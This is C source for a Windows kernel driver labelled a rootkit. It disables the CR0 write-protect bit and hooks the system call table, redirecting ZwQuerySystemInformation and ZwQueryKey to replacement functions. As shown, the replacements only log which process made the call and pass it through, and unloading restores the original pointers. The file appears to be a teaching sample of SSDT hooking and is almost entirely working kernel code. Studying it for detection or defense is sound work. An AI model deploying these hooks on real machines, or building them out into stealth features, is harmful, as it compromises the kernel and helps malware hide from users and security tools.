// BASIC DEVICE DRIVER

#include "ntddk.h"

// Length of process name (rounded up to next DWORD)
#define PROCNAMELEN     20
// Maximum length of NT process name
#define NT_PROCNAMELEN  16

ULONG gProcessNameOffset;

// a cheap way to steal the call number based on the mov instruction
// that lives at the function address.  For example,
//
//		mov     eax, 28h
//
// Every Zw* function starts with a mov instruction that moves the
// call number in EAX.  Thus the call number is 1 byte past the start
// of the function.  It's a hack.  It works for any Zw* function
// exported from ntoskrnl.exe
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)


/////////////////////////////////////////////////////////////////////////
// the system call table infoz
/////////////////////////////////////////////////////////////////////////
#pragma pack(1)
typedef struct ServiceDescriptorTable 
{
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; //Used only in checked build
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} SERVICE_DESCRIPTOR_TABLE, *PSERVICE_DESCRIPTOR_TABLE;
#pragma pack()

//exported from ntoskrnl.exe
__declspec(dllimport)  SERVICE_DESCRIPTOR_TABLE KeServiceDescriptorTable;
#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]

/////////////////////////////////////////////////////////////////////////
// we use ZwQuerySystemInformation to find ntdll.dll in memory
/////////////////////////////////////////////////////////////////////////
NTSYSAPI
NTSTATUS
NTAPI ZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
			IN PVOID SystemInformation,
			IN ULONG SystemInformationLength,
			OUT PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI ZwQueryKey(
            IN HANDLE, 
			IN KEY_INFORMATION_CLASS,
			OUT PVOID, 
			IN ULONG, 
			OUT PULONG );

typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(
            ULONG SystemInformationCLass,
            PVOID SystemInformation,
            ULONG SystemInformationLength,
            PULONG ReturnLength
);

typedef NTSTATUS (*ZWQUERYKEY)( 								  
	HANDLE, 
	KEY_INFORMATION_CLASS,
    PVOID, 
	ULONG, 
	PULONG 
);

ZWQUERYKEY OldZwQueryKey;
ZWQUERYSYSTEMINFORMATION 	OldZwQuerySystemInformation;

/* Find the offset of the process name within the executive process
   block.  We do this by searching for the first occurance of "System"
   in the current process when the device driver is loaded. */

void GetProcessNameOffset()
{
  PEPROCESS curproc = PsGetCurrentProcess();
  int i;
  for( i = 0; i < 3*PAGE_SIZE; i++ ) 
  {
      if( !strncmp( "System", (PCHAR) curproc + i, strlen("System") ))
	{
	  gProcessNameOffset = i;
	}
  }
}

/* Copy the process name into the specified buffer.  */

ULONG GetProcessName( PCHAR theName )
{
  PEPROCESS       curproc;
  char            *nameptr;
  ULONG           i;
  KIRQL           oldirql;

  if( gProcessNameOffset ) 
    {
      curproc = PsGetCurrentProcess();
      nameptr   = (PCHAR) curproc + gProcessNameOffset;
      strncpy( theName, nameptr, NT_PROCNAMELEN );
      theName[NT_PROCNAMELEN] = 0; /* NULL at end */
      return TRUE;
    } 
  return FALSE;
}


VOID Unload( IN PDRIVER_OBJECT DriverObject )
{
	DbgPrint("OnUnload called\n");

	// UNProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		and		eax, 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}

	// put back the old function pointer
	InterlockedExchange( (PLONG) &(SYSTEMSERVICE(ZwQuerySystemInformation)), 
						 (LONG) OldZwQuerySystemInformation);

	// put back the old function pointer
	InterlockedExchange( (PLONG) &(SYSTEMSERVICE(ZwQueryKey)), 
						 (LONG) OldZwQueryKey);

	// REProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		or		eax, NOT 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}

}


NTSTATUS NewZwQueryKey(
            IN HANDLE theHandle, 
			IN KEY_INFORMATION_CLASS theInfoClass,
			OUT PVOID p1, 
			IN ULONG u1, 
			OUT PULONG p2 )
{
		NTSTATUS rc;
        CHAR aProcessName[PROCNAMELEN];
                
        GetProcessName( aProcessName );
        DbgPrint("rootkit: NewZwQueryKey() from %s\n", aProcessName);

        rc = ((ZWQUERYKEY)(OldZwQueryKey)) (
                        theHandle,
						theInfoClass,
						p1,
						u1,
						p2);

		return(rc);
}


NTSTATUS NewZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
                        IN PVOID SystemInformation,
                        IN ULONG SystemInformationLength,
                        OUT PULONG ReturnLength
)
{
        NTSTATUS rc;
        CHAR aProcessName[PROCNAMELEN];
                
        GetProcessName( aProcessName );
        DbgPrint("rootkit: NewZwQuerySystemInformation() from %s\n", aProcessName);

        rc = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
                        SystemInformationClass,
                        SystemInformation,
                        SystemInformationLength,
                        ReturnLength );

		return(rc);
}

NTSTATUS StubbedDispatch(
				  IN PDEVICE_OBJECT theDeviceObject,
				  IN PIRP theIrp )
{
	theIrp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest( theIrp, IO_NO_INCREMENT );

	return theIrp->IoStatus.Status;
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	int i;

	DbgPrint("Rootkit: The hook driver loaded. It uses CR0\n");

	GetProcessNameOffset();

	theDriverObject->DriverUnload  = Unload; 

	for(i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		theDriverObject->MajorFunction[i] = StubbedDispatch;
	}

	// UNProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		and		eax, 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}


	// place the hook using InterlockedExchange (no need to disable interrupts)
	// this uses the LOCK instruction to lock the memory bus during the next instruction 
	// Example:
	// LOCK INC DWORD PTR [EDX+04] 
	// This staves off collisions on multi-processor machines, while cli/sti only disable interrupts
	// on the current processor.
	//
	OldZwQuerySystemInformation = 
		(ZWQUERYSYSTEMINFORMATION) InterlockedExchange(		(PLONG) &(SYSTEMSERVICE(ZwQuerySystemInformation)), 
															(LONG) NewZwQuerySystemInformation);

	OldZwQueryKey = 
		(ZWQUERYKEY) InterlockedExchange(		(PLONG) &(SYSTEMSERVICE(ZwQueryKey)), 
												(LONG) NewZwQueryKey);

	// REProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		or		eax, NOT 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}

	
	return STATUS_SUCCESS;
}

